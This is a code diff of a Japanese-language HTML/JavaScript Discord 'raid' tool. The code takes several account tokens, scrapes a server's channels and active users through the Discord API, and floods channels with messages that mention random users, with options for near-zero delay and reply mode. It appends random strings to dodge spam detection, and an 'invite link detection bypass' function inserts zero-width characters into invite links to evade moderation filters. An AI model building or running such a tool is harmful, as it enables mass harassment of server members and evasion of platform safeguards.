@@ -54,24 +54,24 @@
         .flex-row { display: flex; gap: 10px; margin-bottom: 12px; }
         .flex-1 { flex: 1; }
 
-        .btn { padding: 12px; border: none; border-radius: 4px; font-weight: bold; cursor: pointer; transition: 0.3s; font-size: 13px; }
-        .btn-main { background: var(--accent); color: var(--btn-text); width: 100%; }
+        .btn { padding: 10px; border: none; border-radius: 4px; font-weight: bold; cursor: pointer; transition: 0.3s; font-size: 12px; }
+        .btn-main { background: var(--accent); color: var(--btn-text); width: 100%; font-size: 14px; padding: 15px; }
         .btn-active { background: var(--danger) !important; color: #fff !important; animation: pulse 1s infinite; }
         .btn-stop { background: #666; color: #fff; width: 100px; }
         
-        /* 特定用途のボタン */
-        .btn-sub { background: var(--accent); color: var(--btn-text); font-size: 11px; padding: 0 15px; }
-        .btn-copy-special { background: #28a745; color: white; font-size: 11px; padding: 0 15px; }
+        .btn-sub { background: var(--accent); color: var(--btn-text); font-size: 10px; height: 32px; padding: 0 10px; }
+        .btn-copy-special { background: #28a745; color: white; font-size: 10px; height: 32px; padding: 0 10px; }
 
         @keyframes pulse { 0% { opacity: 1; } 50% { opacity: 0.7; } 100% { opacity: 1; } }
 
         .config-grid { display: grid; grid-template-columns: 1fr 1fr 1fr 1fr; gap: 10px; margin-bottom: 15px; }
 
+        /* 検知回避エリアを小さく */
         .bypass-section {
-            background: rgba(0, 212, 255, 0.05); border: 1px dashed var(--accent);
-            padding: 15px; border-radius: 4px; margin-bottom: 15px;
+            background: rgba(128, 128, 128, 0.05); border: 1px solid var(--border);
+            padding: 10px; border-radius: 4px; margin-bottom: 15px;
         }
-        .light-mode .bypass-section { background: rgba(255, 102, 0, 0.05); }
+        .bypass-inner { display: flex; align-items: center; gap: 8px; }
 
         .status-bar {
             display: flex; justify-content: space-between; background: var(--input-bg); padding: 12px;
@@ -79,7 +79,7 @@
         }
         .status-val { color: var(--accent); font-weight: bold; }
 
-        #log { margin-top: 15px; height: 120px; background: var(--input-bg); border: 1px solid var(--border); padding: 10px; font-size: 11px; overflow-y: auto; color: #666; }
+        #log { margin-top: 15px; height: 100px; background: var(--input-bg); border: 1px solid var(--border); padding: 10px; font-size: 11px; overflow-y: auto; color: #666; }
         
         .theme-toggle {
             position: fixed; bottom: 20px; left: 20px;
@@ -89,13 +89,13 @@
             font-size: 12px; z-index: 1000; transition: 0.2s;
         }
 
-        .toggle-container { display: flex; align-items: center; gap: 10px; background: var(--input-bg); padding: 8px; border-radius: 4px; border: 1px solid var(--border); }
-        .switch { position: relative; display: inline-block; width: 34px; height: 18px; }
+        .toggle-container { display: flex; align-items: center; gap: 10px; background: var(--input-bg); padding: 6px 10px; border-radius: 4px; border: 1px solid var(--border); }
+        .switch { position: relative; display: inline-block; width: 30px; height: 16px; }
         .switch input { opacity: 0; width: 0; height: 0; }
         .slider { position: absolute; cursor: pointer; top: 0; left: 0; right: 0; bottom: 0; background-color: #ccc; transition: .4s; border-radius: 20px; }
-        .slider:before { position: absolute; content: ""; height: 12px; width: 12px; left: 3px; bottom: 3px; background-color: white; transition: .4s; border-radius: 50%; }
+        .slider:before { position: absolute; content: ""; height: 10px; width: 10px; left: 3px; bottom: 3px; background-color: white; transition: .4s; border-radius: 50%; }
         input:checked + .slider { background-color: var(--accent); }
-        input:checked + .slider:before { transform: translateX(16px); }
+        input:checked + .slider:before { transform: translateX(14px); }
     </style>
 </head>
 <body>
@@ -108,15 +108,12 @@
     </div>
 
     <div class="bypass-section">
-        <label>招待リンク検知回避 (入力したリンクを検知不能にします)</label>
-        <div class="flex-row">
-            <input type="text" id="inviteInput" placeholder="discord.gg/xxxxxx を入力">
-            <button class="btn btn-sub" onclick="bypassInvite()">検知回避</button>
-        </div>
-        <div id="bypassResultArea" style="display: none; margin-top: 10px;">
-            <label style="color: #28a745;">変換成功: 以下のリンクをコピーしてください</label>
-            <div class="flex-row">
-                <input type="text" id="bypassedOutput" readonly style="border-color: #28a745; background: rgba(40, 167, 69, 0.05);">
+        <label style="font-size: 10px; opacity: 0.8;">招待リンク検知回避</label>
+        <div class="bypass-inner">
+            <input type="text" id="inviteInput" style="height: 32px; font-size: 11px;" placeholder="discord.gg/リンクを入力">
+            <button class="btn btn-sub" onclick="bypassInvite()">変換</button>
+            <div id="bypassResultContainer" style="display:none; flex: 1; display: none; align-items: center; gap: 5px;">
+                <input type="text" id="bypassedOutput" readonly style="height: 32px; font-size: 11px; border-color: #28a745;">
                 <button class="btn btn-copy-special" onclick="copyBypassed()">コピー</button>
             </div>
         </div>
@@ -137,7 +134,7 @@
     <div class="config-grid">
         <div><label>送信間隔 (秒)</label><input type="number" id="delayNum" value="0" step="0.01" min="0"></div>
         <div><label>取得メッセージ/送信数</label><input type="number" id="limit" value="15"></div>
-        <div><label>回避文字数</label><input type="number" id="randLen" value="15" min="0"></div>
+        <div><label>ランダム文字列数</label><input type="number" id="randLen" value="15" min="0"></div>
         <div>
             <label>回避言語</label>
             <select id="lang">
@@ -152,15 +149,17 @@
         <textarea class="flex-1" id="members" style="height: 60px;" placeholder="アクティブユーザーリスト"></textarea>
     </div>
 
+    <div style="margin-bottom: 15px;">
+        <label>送信メッセージ内容 (デカ目)</label>
+        <textarea id="msgBody" style="height: 100px; font-size: 14px;" placeholder="ここにメッセージを入力..."></textarea>
+    </div>
+
     <div class="flex-row" style="align-items: center;">
-        <div class="toggle-container" style="flex: 0 0 auto;">
+        <div class="toggle-container">
             <span style="font-size: 11px; color: var(--accent);">メンション</span>
             <label class="switch"><input type="checkbox" id="mentionToggle" checked><span class="slider"></span></label>
         </div>
         <div class="flex-1">
-            <input type="text" id="msgBody" placeholder="送信メッセージ内容">
-        </div>
-        <div style="width: 150px;">
             <select id="modeSelect" onchange="setMode(this.value)">
                 <option value="normal">通常raid</option>
                 <option value="reply">リプライraid</option>
@@ -209,38 +208,26 @@
         }
     }
 
-    // 検知回避・表示・コピー
     function bypassInvite() {
         const input = document.getElementById('inviteInput');
         const url = input.value.trim();
-        
         if (!url.includes("discord.gg/") && !url.includes("discord.com/invite/")) {
-            alert("エラー: 有効なDiscord招待リンクを入力してください。");
+            alert("エラー: Discord招待リンクを入力してください。");
             return;
         }
-
-        // ゼロ幅文字 (U+200B) を各文字の間に挿入
         const bypassed = url.split("").join("\u200B");
-        
-        // 結果エリアを表示して値をセット
-        document.getElementById('bypassResultArea').style.display = 'block';
+        const resCont = document.getElementById('bypassResultContainer');
+        resCont.style.display = 'flex';
         document.getElementById('bypassedOutput').value = bypassed;
-        
-        // 自動でスパムメッセージ欄にも反映
         document.getElementById('msgBody').value = bypassed;
-        log("検知回避リンクを作成し、メッセージ欄にセットしました。");
+        log("検知回避リンクを作成しました。");
     }
 
     function copyBypassed() {
         const copyText = document.getElementById("bypassedOutput");
         copyText.select();
-        copyText.setSelectionRange(0, 99999);
         document.execCommand("copy");
-        
-        const btn = document.querySelector('.btn-copy-special');
-        const originalText = btn.innerText;
-        btn.innerText = "コピー完了！";
-        setTimeout(() => { btn.innerText = originalText; }, 2000);
+        alert("コピー完了！");
     }
 
     function log(m) {
@@ -259,22 +246,20 @@
         const t = document.getElementById('tokens').value.split('\n')[0].trim();
         const g = document.getElementById('guildId').value.trim();
         if(!t || !g) return alert("トークンとサーバーIDが必要です");
-
         try {
             log("情報取得中...");
             const rC = await fetch(`https://discord.com/api/v9/guilds/${g}/channels`, { headers: { 'Authorization': t } });
             const channels = await rC.json();
             const textChannels = channels.filter(c => [0,5].includes(c.type));
             document.getElementById('channels').value = textChannels.map(c => c.id).join('\n');
-
             let userSet = new Set();
-            for(const ch of textChannels.slice(0, 5)) {
+            for(const ch of textChannels.slice(0, 3)) {
                 const rM = await fetch(`https://discord.com/api/v9/channels/${ch.id}/messages?limit=50`, { headers: { 'Authorization': t } });
                 const msgs = await rM.json();
                 if(Array.isArray(msgs)) msgs.forEach(m => userSet.add(m.author.id));
             }
             document.getElementById('members').value = Array.from(userSet).join('\n');
-            log("サーバー情報を同期しました。");
+            log("同期完了。");
         } catch(e) { log("取得失敗。"); }
     }
 
@@ -290,30 +275,23 @@
     async function execute() {
         const tokens = document.getElementById('tokens').value.split('\n').filter(x => x.trim());
         if (tokens.length === 0) return alert("トークンを入力してください！");
-
         const msg = document.getElementById('msgBody').value.trim();
         const startBtn = document.getElementById('start');
-        
         sweeping = true;
         startBtn.disabled = true;
         startBtn.innerText = "ATTACKING...";
         startBtn.classList.add('btn-active');
         document.getElementById('stop').disabled = false;
         document.getElementById('statusText').innerText = "RUNNING";
-        
         const channels = document.getElementById('channels').value.split('\n').filter(x => x.trim());
         const members = document.getElementById('members').value.split('\n').filter(x => x.trim());
         const limit = parseInt(document.getElementById('limit').value);
         const isMention = document.getElementById('mentionToggle').checked;
         const delayMs = parseFloat(document.getElementById('delayNum').value) * 1000;
-
-        log("スパムセッション開始");
-
         for (const chId of channels) {
             if (!sweeping) break;
             for (let i = 0; i < limit; i++) {
                 if (!sweeping) break;
-                
                 let replyId = null;
                 if (attackMode === 'reply' && i === 0) {
                    try {
@@ -322,7 +300,6 @@
                        if(lastMsg[0]) replyId = lastMsg[0].id;
                    } catch(e){}
                 }
-
                 sendMsg(tokens, chId, replyId, members, msg, isMention);
                 await new Promise(r => setTimeout(r, delayMs || 10));
             }
@@ -334,23 +311,11 @@
         const token = tokens[Math.floor(Math.random() * tokens.length)];
         let content = (isMention && members.length > 0) ? `<@${members[Math.floor(Math.random() * members.length)]}> ${msg}` : msg;
         content += getRand();
-
-        const payload = { content: content };
-        if (replyId) {
-            payload.message_reference = { message_id: replyId };
-            payload.allowed_mentions = { replied_user: true };
-        }
-
         fetch(`https://discord.com/api/v9/channels/${chId}/messages`, {
             method: 'POST',
             headers: { 'Authorization': token, 'Content-Type': 'application/json' },
-            body: JSON.stringify(payload)
-        }).then(res => {
-            if (res.ok) {
-                sentCount++;
-                document.getElementById('sentCount').innerText = sentCount;
-            }
-        }).catch(e => {});
+            body: JSON.stringify({ content: content, message_reference: replyId ? { message_id: replyId } : undefined })
+        }).then(res => { if(res.ok) { sentCount++; document.getElementById('sentCount').innerText = sentCount; } });
     }
 
     function stop() {
@@ -361,7 +326,6 @@
         startBtn.classList.remove('btn-active');
         document.getElementById('stop').disabled = true;
         document.getElementById('statusText').innerText = "STOPPED";
-        log("停止しました。");
     }
 </script>
 </body>
